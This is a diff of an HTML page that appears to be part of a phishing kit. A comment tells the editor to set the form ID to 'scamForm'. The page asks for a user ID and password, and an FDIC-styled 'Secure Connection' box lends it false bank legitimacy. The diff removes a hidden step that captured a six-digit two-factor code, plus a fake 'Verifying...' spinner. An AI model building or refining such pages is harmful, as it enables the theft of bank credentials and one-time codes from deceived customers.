@@ -270,31 +270,8 @@
     <!-- KEEP YOUR EXISTING INPUT NAMES/IDS IF THEY DIFFER, JUST CHANGE THE FORM ID TO "scamForm" -->
     <input type="text" name="userid" placeholder="User ID" required>
     <input type="password" name="password" placeholder="Password" required>
-    <button type="submit" id="verifyBtn"> <span style="margin-right: 8px;">🔒</span> Verify Now  </button>
     
-<!-- STEP 2: 2FA Input (Hidden by default) -->
-<div id="mfa-step" style="display: none; margin-top: 20px;">
-    <div class="form-group">
-        <label for="mfa_code">Security Code</label>
-        <p style="font-size: 0.85rem; color: #666;">Enter the 6-digit code sent to your device.</p>
-        <input type="text" id="mfa_code" name="mfa_code" placeholder="______" maxlength="6" 
-               style="font-size: 1.2rem; letter-spacing: 3px; text-align: center; width: 100%; padding: 10px; box-sizing: border-box;">
-    </div>
-    
-    <!-- Change button text and ID for the second step -->
-    <button type="submit" id="verifyBtn" class="btn btn-primary" style="width: 100%; margin-top: 15px;">
-        Verify Code
-    </button>
-</div>
-
-<!-- Processing Spinner (Ensure this exists in your HTML, if not, add it here) -->
-<div id="processing" style="display: none; text-align: center; padding: 20px;">
-    <div class="spinner"></div>
-    <p style="margin-top: 10px;">Verifying...</p>
-</div>
-
-
-        </form>
+   </form>
     <!-- White Box Disclaimer with Black Text and Bold Font -->
         <div class="fdic-box">
             <p><strong>Secure Connection</strong><br>
